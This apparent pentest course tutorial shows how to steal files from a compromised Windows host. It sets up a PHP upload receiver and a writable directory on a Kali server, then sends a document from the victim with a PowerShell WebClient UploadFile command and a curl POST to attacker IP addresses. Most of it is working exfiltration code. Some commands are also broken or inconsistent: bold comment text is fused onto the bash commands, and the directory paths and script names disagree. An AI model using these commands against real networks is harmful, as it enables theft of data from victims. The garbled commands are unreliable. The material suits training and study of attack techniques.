In certain scenarios, we may need to exfiltrate data from a target network using a Windows client. This can be complex since standard TFTP, FTP, and HTTP servers are rarely enabled on Windows by default.

Fortunately, if outbound HTTP traffic is allowed, we can use the System.Net.WebClient PowerShell class to upload data to our Kali machine through an HTTP POST request.

To do this, we can create the following PHP script and save it as upload.php in our Kali webroot directory, /var/www/html:

```php
<?php  
$target_dir = "uploads/";  
$target_file = $target_dir . basename($_FILES["targetfile"]["name"]);  
move_uploaded_file($_FILES["targetfile"]["tmp_name"], $target_file)  
?>
```

The PHP code will process an incoming file upload request and save the transferred data to the /var/www/uploads/ directory.

Next, we must create the uploads folder and modify its permissions, granting the www-data user ownership and subsequent write permissions:

```bash
mkdir /var/www/html/web/uploads**# Configuring Directory Ownership with 'www-data' User**  
chown www-data:www-data /var/www/html/web/uploads**# Configuring Directory with Write Permissions**  
chmod 766 /var/www/html/web/uploads
```

Note that this would allow anyone interacting with uploads.php to upload files to our Kali virtual machine.

With Apache and the PHP script ready to receive our file, we move to the compromised Windows host and invoke the UploadFile method from the System.Net.WebClient class to upload the document we want to exfiltrate, in this case, a file named important.docx:

```powershell
C:\Users\Offsec> powershell (New-Object System.Net.WebClient).UploadFile('http://10.11.0.4/upload.php', 'important.docx')
```

It is also possible to upload it with curl:

```powershell
curl -H Content-Type:"multipart/form-data" --form targetfile=@"c:\Users\ted\system" -X POST -v http://192.168.119.197/uploads/upload.php
```

After execution of the powershell command, we can verify the successful transfer of the file:

```bash
kali@kali:/var/www/uploads$ ls -la
total 360
drwxr-xr-x 2 www-data www-data   4096 Feb  2 00:38 .
drwxr-xr-x 4 root     root       4096 Feb  2 00:33 ..
-rw-r--r-- 1 www-data www-data 359250 Feb  2 00:38 important.docx
```